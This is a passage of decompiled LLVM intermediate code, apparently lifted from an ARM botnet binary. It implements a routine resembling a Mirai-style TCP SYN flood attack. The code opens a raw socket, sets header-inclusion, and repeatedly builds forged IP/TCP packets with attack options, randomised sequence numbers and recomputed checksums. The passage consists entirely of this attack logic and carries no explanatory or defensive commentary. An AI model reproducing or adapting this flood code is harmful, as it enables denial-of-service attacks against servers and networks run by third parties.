  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c388 = load i32, i32* @r4, align 4
  store i32 %v0_c388, i32* %r0.global-to-local, align 4
  %v5_c38c = inttoptr i32 %v0_c380 to i32*
  %v6_c38c = call i32 @attack_get_opt_ip(i32 %v0_c388, i32* %v5_c38c, i32 25, i32 %v2_c37c, i32 %v6_c370)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c3a0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c3a0, i32* %r0.global-to-local, align 4
  %v7_c3a4 = icmp eq i32 %v3_c3a0, -1
  store i1 %v7_c3a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c3a0, i32* @sl, align 4
  br i1 %v7_c3a4, label %dec_label_pc_c878, label %dec_label_pc_c3b0

dec_label_pc_c3b0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c3b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c3b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c3cc = call i32 @__GI_setsockopt(i32 %v3_c3a0, i32 0, i32 3, i32 %v6_c3b8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c3cc, i32* %r0.global-to-local, align 4
  %v7_c3d0 = icmp eq i32 %v5_c3cc, -1
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c870, label %dec_label_pc_c3d8

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c3b0
  %v3_c3e0 = mul i32 %v7_c234, 65536
  store i32 %v3_c3e0, i32* %r0.global-to-local, align 4
  %v0_c3e4 = load i32, i32* %fp.global-to-local, align 4
  %v3_c3e4 = mul i32 %v0_c3e4, 65536
  store i32 %v3_c3e4, i32* %r4.global-to-local, align 4
  %v0_c3e8 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c2f8, i32* %r2.global-to-local, align 4
  %v3_c3f4 = urem i32 %v7_c234, 65536
  store i32 %v3_c3f4, i32* %r3.global-to-local, align 4
  %v3_c3f8 = urem i32 %v0_c3e4, 65536
  %v3_c3fc = urem i32 %v0_c3e8, 65536
  store i32 %v3_c3fc, i32* %r1.global-to-local, align 4
  %v0_c400 = load i32, i32* @r7, align 4
  %v2_c400 = icmp eq i32 %v0_c400, 0
  store i1 %v2_c400, i1* %cpsr_z.global-to-local, align 1
  %v1_c410 = urem i32 %v6_c2f8, 256
  store i32 %v1_c410, i32* @fp, align 4
  br i1 %v2_c400, label %dec_label_pc_c664.preheader, label %dec_label_pc_c418

dec_label_pc_c418:                                ; preds = %dec_label_pc_c3d8
  %tmp52 = mul i32 %v5_c2c8, 256
  %v3_c430 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_c234, 256
  %v3_c434 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v5_c2c8, 256
  %v4_c43c = urem i32 %tmp54, 256
  %v5_c43c = or i32 %v4_c43c, %v3_c430
  store i32 %v5_c43c, i32* @lr, align 4
  %v1_c438 = mul i32 %v7_c234, 256
  %v4_c440 = and i32 %v1_c438, 65280
  %v5_c440 = or i32 %v4_c440, %v3_c434
  %tmp55 = mul i32 %v0_c3e4, 256
  %v3_c44c = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_c3e8, 256
  %v3_c450 = and i32 %tmp56, 65280
  %v1_c454 = urem i32 %v6_c2f8, 2
  %v1_c458 = urem i32 %v6_c310, 2
  %tmp57 = udiv i32 %v0_c3e4, 256
  %v4_c45c = urem i32 %tmp57, 256
  %v5_c45c = or i32 %v4_c45c, %v3_c44c
  store i32 %v5_c45c, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_c3e8, 256
  %v4_c460 = urem i32 %tmp58, 256
  %v5_c460 = or i32 %v4_c460, %v3_c450
  store i32 %v5_c460, i32* @r5, align 4
  %v1_c47c = urem i32 %v6_c328, 2
  store i32 %v1_c47c, i32* %r2.global-to-local, align 4
  %v1_c480 = urem i32 %v6_c340, 2
  store i32 %v1_c480, i32* %r3.global-to-local, align 4
  %v1_c484 = urem i32 %v6_c358, 2
  store i32 %v1_c484, i32* %r0.global-to-local, align 4
  %v1_c488 = urem i32 %v6_c370, 2
  store i32 %v1_c488, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext4 = mul nuw i32 %v5_c440, 65536
  %v4_c510 = sdiv i32 %sext4, 65536
  %tmp = sub nsw i32 0, %v1_c458
  %v4_c574 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_c47c
  %v4_c588 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_c480
  %v4_c5a0 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_c484
  %v3_c5b4 = and i32 %tmp64, 2
  %v1_c504 = trunc i32 %v6_c24c to i8
  br label %dec_label_pc_c4a8

dec_label_pc_c4a8:                                ; preds = %bb61, %dec_label_pc_c418
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_c4b0, i32* %r0.global-to-local, align 4
  %v3_c4b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c4b4, i32* %r2.global-to-local, align 4
  %v1_c4b8 = load i32, i32* @sb, align 4
  %v2_c4b8 = load i32, i32* @r4, align 4
  %v5_c4b8 = mul i32 %v2_c4b8, 4
  %v6_c4b8 = add i32 %v5_c4b8, %v1_c4b8
  %v7_c4b8 = inttoptr i32 %v6_c4b8 to i32*
  store i32 %v2_c4b0, i32* %v7_c4b8, align 4
  %v0_c4bc = load i32, i32* %r2.global-to-local, align 4
  %v3_c4bc = mul i32 %v0_c4bc, 32
  store i32 %v3_c4bc, i32* %r3.global-to-local, align 4
  %v0_c4c0 = load i32, i32* @sb, align 4
  %v4_c4c0 = mul i32 %v0_c4bc, 4
  %v5_c4c0 = add i32 %v0_c4c0, %v4_c4c0
  %v6_c4c0 = inttoptr i32 %v5_c4c0 to i32*
  %v7_c4c0 = load i32, i32* %v6_c4c0, align 4
  store i32 %v7_c4c0, i32* %r4.global-to-local, align 4
  %v5_c4c4 = mul i32 %v0_c4bc, 24
  store i32 %v5_c4c4, i32* %r3.global-to-local, align 4
  %v1_c4c8 = load i32, i32* @r8, align 4
  %v2_c4c8 = add i32 %v1_c4c8, %v5_c4c4
  store i32 %v2_c4c8, i32* %r0.global-to-local, align 4
  %v1_c4cc = inttoptr i32 %v7_c4c0 to i8*
  %v2_c4cc = load i8, i8* %v1_c4cc, align 1
  %tmp65 = urem i8 %v2_c4cc, 16
  %v1_c4d0 = zext i8 %tmp65 to i32
  %v1_c4d4 = or i32 %v1_c4d0, 64
  store i32 %v1_c4d4, i32* %r3.global-to-local, align 4
  %v1_c4d8 = trunc i32 %v1_c4d4 to i8
  store i8 %v1_c4d8, i8* %v1_c4cc, align 1
  %v0_c4dc = load i32, i32* %r4.global-to-local, align 4
  %v1_c4dc = inttoptr i32 %v0_c4dc to i8*
  %v2_c4dc = load i8, i8* %v1_c4dc, align 1
  %v1_c4e0 = and i8 %v2_c4dc, -16
  %v1_c4e4 = or i8 %v1_c4e0, 5
  store i32 %v1_c278, i32* %r3.global-to-local, align 4
  store i8 %v1_c4e4, i8* %v1_c4dc, align 1
  %v2_c4f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4f4 = add i32 %v2_c4f4, 1
  %v4_c4f4 = inttoptr i32 %v3_c4f4 to i8*
  store i8 %v5_c230, i8* %v4_c4f4, align 1
  store i32 %v1_c254, i32* %r2.global-to-local, align 4
  %v0_c4fc = load i32, i32* %r3.global-to-local, align 4
  %v2_c4fc = icmp eq i32 %v0_c4fc, 0
  store i1 %v2_c4fc, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_c504 = load i32, i32* %r4.global-to-local, align 4
  %v3_c504 = add i32 %v2_c504, 8
  %v4_c504 = inttoptr i32 %v3_c504 to i8*
  store i8 %v1_c504, i8* %v4_c504, align 1
  %v0_c508 = load i32, i32* %r3.global-to-local, align 4
  %v1_c508 = trunc i32 %v0_c508 to i16
  %v2_c508 = load i32, i32* %r4.global-to-local, align 4
  %v3_c508 = add i32 %v2_c508, 2
  %v4_c508 = inttoptr i32 %v3_c508 to i16*
  store i16 %v1_c508, i16* %v4_c508, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_c510, i32* %r1.global-to-local, align 4
  %v0_c514 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c514, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_c4a8
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_c4a8, %bb
  %v2_c518 = load i32, i32* %r4.global-to-local, align 4
  %v3_c518 = add i32 %v2_c518, 9
  %v4_c518 = inttoptr i32 %v3_c518 to i8*
  store i8 6, i8* %v4_c518, align 1
  %v0_c51c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c51c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_c51c = load i32, i32* %r2.global-to-local, align 4
  %v2_c51c = trunc i32 %v1_c51c to i16
  %v3_c51c = load i32, i32* %r4.global-to-local, align 4
  %v4_c51c = add i32 %v3_c51c, 6
  %v5_c51c = inttoptr i32 %v4_c51c to i16*
  store i16 %v2_c51c, i16* %v5_c51c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_c38c, i32* %r2.global-to-local, align 4
  %v1_c524 = load i32, i32* %r4.global-to-local, align 4
  %v2_c524 = add i32 %v1_c524, 12
  %v3_c524 = inttoptr i32 %v2_c524 to i32*
  store i32 %v6_c38c, i32* %v3_c524, align 4
  %v0_c528 = load i32, i32* %r0.global-to-local, align 4
  %v1_c528 = add i32 %v0_c528, 16
  %v2_c528 = inttoptr i32 %v1_c528 to i32*
  %v3_c528 = load i32, i32* %v2_c528, align 4
  store i32 %v3_c528, i32* %r3.global-to-local, align 4
  %v0_c52c = load i32, i32* %r1.global-to-local, align 4
  %v1_c52c = trunc i32 %v0_c52c to i16
  %v2_c52c = load i32, i32* %r4.global-to-local, align 4
  %v3_c52c = add i32 %v2_c52c, 4
  %v4_c52c = inttoptr i32 %v3_c52c to i16*
  store i16 %v1_c52c, i16* %v4_c52c, align 2
  %v0_c530 = load i32, i32* %r3.global-to-local, align 4
  %v1_c530 = load i32, i32* %r4.global-to-local, align 4
  %v2_c530 = add i32 %v1_c530, 16
  %v3_c530 = inttoptr i32 %v2_c530 to i32*
  store i32 %v0_c530, i32* %v3_c530, align 4
  %v0_c534 = load i32, i32* @r6, align 4
  %v1_c534 = trunc i32 %v0_c534 to i16
  %v2_c534 = load i32, i32* %r4.global-to-local, align 4
  %v3_c534 = add i32 %v2_c534, 20
  %v4_c534 = inttoptr i32 %v3_c534 to i16*
  store i16 %v1_c534, i16* %v4_c534, align 2
  %v0_c538 = load i32, i32* %r4.global-to-local, align 4
  %v1_c538 = add i32 %v0_c538, 20
  store i32 %v1_c538, i32* %r1.global-to-local, align 4
  %v1_c53c = add i32 %v0_c538, 32
  %v2_c53c = inttoptr i32 %v1_c53c to i8*
  %v3_c53c = load i8, i8* %v2_c53c, align 1
  %v4_c53c = zext i8 %v3_c53c to i32
  store i32 %v4_c53c, i32* %r3.global-to-local, align 4
  %v1_c540 = add i32 %v0_c538, 33
  %v2_c540 = inttoptr i32 %v1_c540 to i8*
  %v3_c540 = load i8, i8* %v2_c540, align 1
  %v4_c540 = zext i8 %v3_c540 to i32
  store i32 %v1_c454, i32* %r0.global-to-local, align 4
  %v1_c548 = urem i8 %v3_c53c, 16
  %v1_c54c = or i8 %v1_c548, -96
  %v1_c550 = and i32 %v4_c540, 223
  store i32 %v1_c550, i32* %r2.global-to-local, align 4
  store i8 %v1_c54c, i8* %v2_c53c, align 1
  %v0_c558 = load i32, i32* %r2.global-to-local, align 4
  %v1_c558 = load i32, i32* %r0.global-to-local, align 4
  %v4_c558 = mul i32 %v1_c558, 32
  %v5_c558 = or i32 %v4_c558, %v0_c558
  store i32 %v5_c558, i32* %r2.global-to-local, align 4
  store i32 %v5_c43c, i32* %r3.global-to-local, align 4
  %v1_c560 = trunc i32 %v5_c558 to i8
  %v2_c560 = load i32, i32* %r1.global-to-local, align 4
  %v3_c560 = add i32 %v2_c560, 13
  %v4_c560 = inttoptr i32 %v3_c560 to i8*
  store i8 %v1_c560, i8* %v4_c560, align 1
  %v0_c564 = load i32, i32* %r3.global-to-local, align 4
  %v1_c564 = load i32, i32* %r1.global-to-local, align 4
  %v2_c564 = add i32 %v1_c564, 4
  %v3_c564 = inttoptr i32 %v2_c564 to i32*
  store i32 %v0_c564, i32* %v3_c564, align 4
  %v0_c568 = load i32, i32* %r1.global-to-local, align 4
  %v1_c568 = add i32 %v0_c568, 13
  %v2_c568 = inttoptr i32 %v1_c568 to i8*
  %v3_c568 = load i8, i8* %v2_c568, align 1
  %v4_c568 = zext i8 %v3_c568 to i32
  store i32 %v1_c458, i32* %r0.global-to-local, align 4
  %v1_c570 = and i32 %v4_c568, 239
  %v5_c574 = or i32 %v1_c570, %v4_c574
  store i32 %v5_c574, i32* %r3.global-to-local, align 4
  %v1_c578 = trunc i32 %v5_c574 to i8
  store i8 %v1_c578, i8* %v2_c568, align 1
  %v0_c57c = load i32, i32* %r1.global-to-local, align 4
  %v1_c57c = add i32 %v0_c57c, 13
  %v2_c57c = inttoptr i32 %v1_c57c to i8*
  %v3_c57c = load i8, i8* %v2_c57c, align 1
  %v4_c57c = zext i8 %v3_c57c to i32
  store i32 %v1_c47c, i32* %r3.global-to-local, align 4
  %v1_c584 = and i32 %v4_c57c, 247
  %v5_c588 = or i32 %v1_c584, %v4_c588
  store i32 %v5_c588, i32* %r2.global-to-local, align 4
  %v0_c58c = load i32, i32* @r5, align 4
  %v1_c58c = trunc i32 %v0_c58c to i16
  %v3_c58c = add i32 %v0_c57c, 2
  %v4_c58c = inttoptr i32 %v3_c58c to i16*
  store i16 %v1_c58c, i16* %v4_c58c, align 2
  %v0_c590 = load i32, i32* %r2.global-to-local, align 4
  %v1_c590 = trunc i32 %v0_c590 to i8
  %v2_c590 = load i32, i32* %r1.global-to-local, align 4
  %v3_c590 = add i32 %v2_c590, 13
  %v4_c590 = inttoptr i32 %v3_c590 to i8*
  store i8 %v1_c590, i8* %v4_c590, align 1
  %v0_c594 = load i32, i32* %r1.global-to-local, align 4
  %v1_c594 = add i32 %v0_c594, 13
  %v2_c594 = inttoptr i32 %v1_c594 to i8*
  %v3_c594 = load i8, i8* %v2_c594, align 1
  %v4_c594 = zext i8 %v3_c594 to i32
  store i32 %v1_c480, i32* %r0.global-to-local, align 4
  %v1_c59c = and i32 %v4_c594, 251
  %v5_c5a0 = or i32 %v1_c59c, %v4_c5a0
  store i32 %v5_c5a0, i32* %r3.global-to-local, align 4
  %v1_c5a4 = trunc i32 %v5_c5a0 to i8
  store i8 %v1_c5a4, i8* %v2_c594, align 1
  %v0_c5a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5a8 = add i32 %v0_c5a8, 13
  %v2_c5a8 = inttoptr i32 %v1_c5a8 to i8*
  %v3_c5a8 = load i8, i8* %v2_c5a8, align 1
  %v4_c5a8 = zext i8 %v3_c5a8 to i32
  store i32 %v1_c484, i32* %r3.global-to-local, align 4
  %v1_c5b0 = and i32 %v4_c5a8, 253
  %v4_c5b4 = or i32 %v1_c5b0, %v3_c5b4
  store i32 %v4_c5b4, i32* %r2.global-to-local, align 4
  %v1_c5b8 = trunc i32 %v4_c5b4 to i8
  store i8 %v1_c5b8, i8* %v2_c5a8, align 1
  %v0_c5bc = load i32, i32* %r1.global-to-local, align 4
  %v1_c5bc = add i32 %v0_c5bc, 13
  %v2_c5bc = inttoptr i32 %v1_c5bc to i8*
  %v3_c5bc = load i8, i8* %v2_c5bc, align 1
  %v4_c5bc = zext i8 %v3_c5bc to i32
  store i32 %v1_c488, i32* %r0.global-to-local, align 4
  %v1_c5c4 = and i32 %v4_c5bc, 254
  %v2_c5c8 = or i32 %v1_c5c4, %v1_c488
  store i32 %v2_c5c8, i32* %r3.global-to-local, align 4
  %v1_c5cc = trunc i32 %v2_c5c8 to i8
  store i8 %v1_c5cc, i8* %v2_c5bc, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_c5d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5d8 = add i32 %v2_c5d8, 40
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i8*
  store i8 2, i8* %v4_c5d8, align 1
  %v0_c5dc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5dc = trunc i32 %v0_c5dc to i8
  %v2_c5dc = load i32, i32* %r4.global-to-local, align 4
  %v3_c5dc = add i32 %v2_c5dc, 41
  %v4_c5dc = inttoptr i32 %v3_c5dc to i8*
  store i8 %v1_c5dc, i8* %v4_c5dc, align 1
  %v0_c5e0 = call i32 @rand_next()
  %v1_c5e4 = urem i32 %v0_c5e0, 16
  %v1_c5e8 = or i32 %v1_c5e4, 1392
  %tmp66 = mul nuw nsw i32 %v1_c5e8, 256
  %v3_c5f4 = add nuw nsw i32 %tmp66, 2048
  %v5_c5fc = or i32 %v3_c5f4, 5
  %v1_c600 = trunc i32 %v5_c5fc to i16
  %v2_c600 = load i32, i32* %r4.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 42
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v2_c608 = load i32, i32* %r4.global-to-local, align 4
  %v3_c608 = add i32 %v2_c608, 44
  %v4_c608 = inttoptr i32 %v3_c608 to i8*
  store i8 4, i8* %v4_c608, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_c618 = load i32, i32* %r4.global-to-local, align 4
  %v3_c618 = add i32 %v2_c618, 46
  %v4_c618 = inttoptr i32 %v3_c618 to i8*
  store i8 8, i8* %v4_c618, align 1
  %v0_c61c = load i32, i32* %r2.global-to-local, align 4
  %v1_c61c = trunc i32 %v0_c61c to i8
  %v2_c61c = load i32, i32* %r4.global-to-local, align 4
  %v3_c61c = add i32 %v2_c61c, 47
  %v4_c61c = inttoptr i32 %v3_c61c to i8*
  store i8 %v1_c61c, i8* %v4_c61c, align 1
  %v0_c620 = load i32, i32* %r0.global-to-local, align 4
  %v1_c620 = trunc i32 %v0_c620 to i8
  %v2_c620 = load i32, i32* %r4.global-to-local, align 4
  %v3_c620 = add i32 %v2_c620, 45
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v1_c620, i8* %v4_c620, align 1
  %v0_c624 = call i32 @rand_next()
  store i32 %v0_c624, i32* %r0.global-to-local, align 4
  %v2_c62c = load i32, i32* %r4.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 59
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 6, i8* %v4_c62c, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c63c = load i32, i32* %r4.global-to-local, align 4
  %v2_c63c = add i32 %v1_c63c, 48
  %v3_c63c = inttoptr i32 %v2_c63c to i32*
  store i32 %v0_c624, i32* %v3_c63c, align 4
  %v0_c640 = load i32, i32* %r3.global-to-local, align 4
  %v1_c640 = load i32, i32* %r4.global-to-local, align 4
  %v2_c640 = add i32 %v1_c640, 52
  %v3_c640 = inttoptr i32 %v2_c640 to i32*
  store i32 %v0_c640, i32* %v3_c640, align 4
  %v0_c644 = load i32, i32* %r2.global-to-local, align 4
  %v1_c644 = trunc i32 %v0_c644 to i8
  %v2_c644 = load i32, i32* %r4.global-to-local, align 4
  %v3_c644 = add i32 %v2_c644, 56
  %v4_c644 = inttoptr i32 %v3_c644 to i8*
  store i8 %v1_c644, i8* %v4_c644, align 1
  %v0_c648 = load i32, i32* %r1.global-to-local, align 4
  %v1_c648 = trunc i32 %v0_c648 to i8
  %v2_c648 = load i32, i32* %r4.global-to-local, align 4
  %v3_c648 = add i32 %v2_c648, 58
  %v4_c648 = inttoptr i32 %v3_c648 to i8*
  store i8 %v1_c648, i8* %v4_c648, align 1
  %v0_c64c = load i32, i32* %r1.global-to-local, align 4
  %v1_c64c = trunc i32 %v0_c64c to i8
  %v2_c64c = load i32, i32* %r4.global-to-local, align 4
  %v3_c64c = add i32 %v2_c64c, 57
  %v4_c64c = inttoptr i32 %v3_c64c to i8*
  store i8 %v1_c64c, i8* %v4_c64c, align 1
  %v3_c650 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  %v1_c654 = load i32, i32* %r2.global-to-local, align 4
  %v2_c654 = add i32 %v1_c654, %v3_c650
  store i32 %v2_c654, i32* @r4, align 4
  %v1_c658 = load i32, i32* @r7, align 4
  %v9_c658 = icmp eq i32 %v2_c654, %v1_c658
  store i1 %v9_c658, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c654, i32* %stack_var_-44, align 4
  %v5_c660 = icmp slt i32 %v2_c654, %v1_c658
  br i1 %v5_c660, label %dec_label_pc_c4a8, label %dec_label_pc_c664.preheader

dec_label_pc_c664.preheader:                      ; preds = %bb61, %dec_label_pc_c3d8
  %v0_c6686 = phi i32 [ 0, %dec_label_pc_c3d8 ], [ %v1_c658, %bb61 ]
  %v3_c7e0 = icmp eq i32 %v6_c38c, -1
  %v8_c7e0 = icmp eq i32 %v6_c38c, -1
  %v3_c6b0 = icmp eq i32 %v3_c3f4, 65535
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774, %dec_label_pc_c664.preheader
  %v0_c668 = phi i32 [ %v0_c6686, %dec_label_pc_c664.preheader ], [ 0, %dec_label_pc_c774 ], [ 0, %dec_label_pc_c664 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c668 = icmp eq i32 %v0_c668, 0
  store i1 %v2_c668, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c668, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c674:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %dec_label_pc_c6f0, %dec_label_pc_c674
  %v1_c688 = phi i32 [ %v1_c764, %dec_label_pc_c6f0 ], [ 0, %dec_label_pc_c674 ]
  %v5_c67c = mul i32 %v1_c688, 24
  %v1_c680 = load i32, i32* @r8, align 4
  %v2_c680 = add i32 %v1_c680, %v5_c67c
  store i32 %v2_c680, i32* %r3.global-to-local, align 4
  %v1_c684 = add i32 %v2_c680, 20
  %v2_c684 = inttoptr i32 %v1_c684 to i8*
  %v3_c684 = load i8, i8* %v2_c684, align 1
  %v4_c684 = zext i8 %v3_c684 to i32
  store i32 %v4_c684, i32* %r2.global-to-local, align 4
  %v0_c688 = load i32, i32* @sb, align 4
  %v4_c688 = mul i32 %v1_c688, 4
  %v5_c688 = add i32 %v0_c688, %v4_c688
  %v6_c688 = inttoptr i32 %v5_c688 to i32*
  %v7_c688 = load i32, i32* %v6_c688, align 4
  store i32 %v7_c688, i32* @r5, align 4
  %v7_c68c = icmp eq i8 %v3_c684, 31
  store i1 %v7_c68c, i1* %cpsr_z.global-to-local, align 1
  %v1_c690 = add i32 %v7_c688, 20
  store i32 %v1_c690, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_c684, 32
  br i1 %tmp67, label %dec_label_pc_c788, label %dec_label_pc_c698

dec_label_pc_c698:                                ; preds = %dec_label_pc_c678
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c6a4:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c6b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c6b0, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v1_c6bc = phi i32 [ %v1_c7f8, %dec_label_pc_c7e8 ], [ 65535, %dec_label_pc_c6a4 ]
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v9_c6bc = icmp eq i32 %v3_c3f8, %v1_c6bc
  store i1 %v9_c6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6bc, label %dec_label_pc_c818, label %dec_label_pc_c6c4

dec_label_pc_c6c4:                                ; preds = %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge, %dec_label_pc_c6b8
  %v1_c6c8 = phi i32 [ %v1_c6c8.pre, %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge ], [ %v1_c6bc, %dec_label_pc_c6b8 ]
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v9_c6c8 = icmp eq i32 %v3_c3fc, %v1_c6c8
  store i1 %v9_c6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6c8, label %dec_label_pc_c82c, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge, %dec_label_pc_c6c4
  %v1_c6d4 = phi i32 [ %v1_c6d4.pre, %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge ], [ %v1_c6c8, %dec_label_pc_c6c4 ]
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v9_c6d4 = icmp eq i32 %v5_c2c8, %v1_c6d4
  store i1 %v9_c6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6d4, label %dec_label_pc_c840, label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge, %dec_label_pc_c6d0
  %v1_c6e0 = phi i32 [ %v1_c6e0.pre, %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge ], [ %v1_c6d4, %dec_label_pc_c6d0 ]
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v9_c6e0 = icmp eq i32 %v6_c2e0, %v1_c6e0
  store i1 %v9_c6e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6e0, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c6e8:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c6e8 = load i32, i32* @fp, align 4
  %v2_c6e8 = icmp eq i32 %v0_c6e8, 0
  store i1 %v2_c6e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c6e8, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c6f0:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854, %dec_label_pc_c864
  %v2_c6f4 = load i32, i32* @r5, align 4
  %v3_c6f4 = add i32 %v2_c6f4, 10
  %v4_c6f4 = inttoptr i32 %v3_c6f4 to i16*
  store i16 0, i16* %v4_c6f4, align 2
  %v0_c6f8 = load i32, i32* @r5, align 4
  store i32 %v0_c6f8, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c700 = call i32 @checksum_generic(i32 %v0_c6f8, i32 20)
  %v3_c700 = trunc i32 %v2_c700 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c708 = load i32, i32* @r5, align 4
  %v4_c708 = add i32 %v3_c708, 10
  %v5_c708 = inttoptr i32 %v4_c708 to i16*
  store i16 %v3_c700, i16* %v5_c708, align 2
  %v0_c70c = load i32, i32* @r6, align 4
  store i32 %v0_c70c, i32* @r1, align 4
  %v0_c710 = load i32, i32* %r2.global-to-local, align 4
  %v1_c710 = trunc i32 %v0_c710 to i16
  %v3_c710 = add i32 %v0_c70c, 16
  %v4_c710 = inttoptr i32 %v3_c710 to i16*
  store i16 %v1_c710, i16* %v4_c710, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c71c = load i32, i32* @r5, align 4
  store i32 %v0_c71c, i32* %r0.global-to-local, align 4
  %v4_c720 = call i32 @checksum_tcpudp(i32 %v0_c71c, i32 %v0_c70c, i32 10240, i32 40)
  %v5_c720 = trunc i32 %v4_c720 to i16
  store i32 %v4_c720, i32* %r0.global-to-local, align 4
  %v3_c724 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c724, i32* %r3.global-to-local, align 4
  %v3_c728 = mul i32 %v3_c724, 32
  store i32 %v3_c728, i32* %lr.global-to-local, align 4
  %v3_c72c = load i32, i32* @r6, align 4
  %v4_c72c = add i32 %v3_c72c, 16
  %v5_c72c = inttoptr i32 %v4_c72c to i16*
  store i16 %v5_c720, i16* %v5_c72c, align 2
  %v0_c730 = load i32, i32* %lr.global-to-local, align 4
  %v1_c730 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_c730, -8
  %v5_c730 = add i32 %v0_c730, %tmp68
  store i32 %v5_c730, i32* %lr.global-to-local, align 4
